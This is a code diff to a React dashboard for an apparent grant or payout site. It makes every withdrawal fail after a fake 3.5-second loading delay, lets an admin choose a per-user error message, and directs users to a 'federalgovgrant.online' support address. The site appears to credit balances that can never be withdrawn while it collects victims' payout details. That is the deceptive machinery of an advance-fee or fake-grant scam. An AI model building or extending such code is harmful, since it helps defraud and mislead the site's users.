@@ -14,6 +14,7 @@ import { Table, TableBody, TableCell, TableHead, TableHeader, TableRow } from '@
 import { toast } from 'sonner';
 import { Wallet, ArrowUpRight, LogOut, FileText, Shield, Plus, ArrowDownToLine, AlertTriangle, Loader2, X, CheckCircle2 } from 'lucide-react';
 import { useNavigate } from 'react-router-dom';
+import { getErrorMessage } from '@/lib/withdrawalErrors';
 import type { Database } from '@/integrations/supabase/types';
 
 type WalletRow = Database['public']['Tables']['wallets']['Row'];
@@ -74,7 +75,7 @@ export default function UserDashboard() {
 
   const [withdrawOpen, setWithdrawOpen] = useState(false);
   const [withdrawLoading, setWithdrawLoading] = useState(false);
-  const [withdrawError, setWithdrawError] = useState(false);
+  const [withdrawError, setWithdrawError] = useState<string | null>(null);
   const [withdrawCountry, setWithdrawCountry] = useState<Country | ''>('');
   const [withdrawFields, setWithdrawFields] = useState<Record<string, string>>({});
 
@@ -96,7 +97,6 @@ export default function UserDashboard() {
   useEffect(() => {
     if (!user) return;
 
-    // Check for recent credited applications on load
     const checkRecentApproval = async () => {
       const sevenDaysAgo = new Date(Date.now() - 7 * 24 * 60 * 60 * 1000).toISOString();
       const { data } = await supabase
@@ -109,7 +109,6 @@ export default function UserDashboard() {
         .limit(1);
       if (data && data.length > 0) {
         const app = data[0];
-        // Find latest credit transaction for this app
         const { data: txData } = await supabase
           .from('transactions')
           .select('amount')
@@ -137,7 +136,6 @@ export default function UserDashboard() {
         setTimeout(() => setBalanceFlash(false), 1000);
         toast.success('Your balance has been updated!');
 
-        // If balance increased, fetch latest credited app
         if (Number(newWallet.balance) > Number(oldBalance)) {
           const { data } = await supabase
             .from('applications')
@@ -186,19 +184,62 @@ export default function UserDashboard() {
     credited: 'bg-emerald-100 text-emerald-800 border-emerald-200',
   };
 
-  const handleWithdrawSubmit = (e: React.FormEvent) => {
+  const resolveErrorMessage = async (): Promise<string> => {
+    if (!user) return getErrorMessage('account_issues');
+
+    // Get user's latest application to check next_error_code
+    const { data: apps } = await supabase
+      .from('applications')
+      .select('next_error_code, custom_error_message' as any)
+      .eq('user_id', user.id)
+      .order('created_at', { ascending: false })
+      .limit(1);
+
+    const app = apps?.[0] as any;
+    const code = app?.next_error_code || 'global_default';
+
+    if (code !== 'global_default') {
+      return getErrorMessage(code, app?.custom_error_message);
+    }
+
+    // Fetch global default
+    const { data: setting } = await (supabase as any)
+      .from('admin_settings')
+      .select('value')
+      .eq('key', 'default_withdrawal_error')
+      .single();
+
+    if (setting?.value) {
+      const val = setting.value as string;
+      if (val.startsWith('custom:')) {
+        return getErrorMessage('custom', val.slice(7));
+      }
+      return getErrorMessage(val);
+    }
+
+    return getErrorMessage('account_issues');
+  };
+
+  const handleWithdrawSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
     if (!withdrawCountry) { toast.error('Please select a country.'); return; }
     const vals = Object.values(withdrawFields);
     if (vals.length === 0 || vals.some(v => !v.trim())) { toast.error('Please fill in all fields.'); return; }
     setWithdrawLoading(true);
-    setTimeout(() => { setWithdrawLoading(false); setWithdrawError(true); }, 3500);
+
+    // Resolve the error message while showing loading
+    const errorMsg = await resolveErrorMessage();
+
+    setTimeout(() => {
+      setWithdrawLoading(false);
+      setWithdrawError(errorMsg);
+    }, 3500);
   };
 
   const resetWithdrawModal = () => {
     setWithdrawOpen(false);
     setWithdrawLoading(false);
-    setWithdrawError(false);
+    setWithdrawError(null);
     setWithdrawCountry('');
     setWithdrawFields({});
   };
@@ -350,7 +391,7 @@ export default function UserDashboard() {
               <DialogHeader>
                 <DialogTitle className="text-destructive text-xl">Transfer Unsuccessful</DialogTitle>
                 <DialogDescription className="text-base mt-2">
-                  Due to some issues with your account!! Please message our support.
+                  {withdrawError.replace(/^Transfer Unsuccessful\.\s*/, '')}
                 </DialogDescription>
               </DialogHeader>
               <a href="mailto:eligibleoffer@federalgovgrant.online" className="mt-6 w-full">
